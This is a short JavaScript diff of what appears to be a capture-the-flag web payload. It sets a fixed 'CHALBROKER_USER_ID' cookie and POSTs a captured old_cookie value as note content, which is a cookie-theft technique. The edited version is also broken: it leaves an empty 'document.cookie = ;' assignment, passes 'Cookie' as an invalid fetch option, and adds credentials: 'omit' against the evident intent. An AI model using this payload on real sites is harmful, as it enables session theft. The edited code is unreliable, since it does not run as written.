@@ -15,7 +15,7 @@ const seconds = currentTime.getSeconds().toString().padStart(2, '0');
 const timeString = `${hours}:${minutes}:${seconds}`;
 
 // Set the specific cookie values
-document.cookie = 'CHALBROKER_USER_ID=pv2160';
+document.cookie = ;
 
 // Define request headers
 const headers = {
@@ -25,6 +25,8 @@ const headers = {
 // Perform a POST request with cookies and payload
 fetch(url, {
   method: 'POST',
-  "body": "title=test1001" + timeString + "&content=" + old_cookie + "&submit=save",
-  headers: headers
+  'Cookie': 'CHALBROKER_USER_ID=pv2160',
+  'body': "title=test1001" + timeString + "&content=" + old_cookie + "&submit=save",
+  headers: headers,
+  credentials: 'omit', // This prevents sending cookies
 });
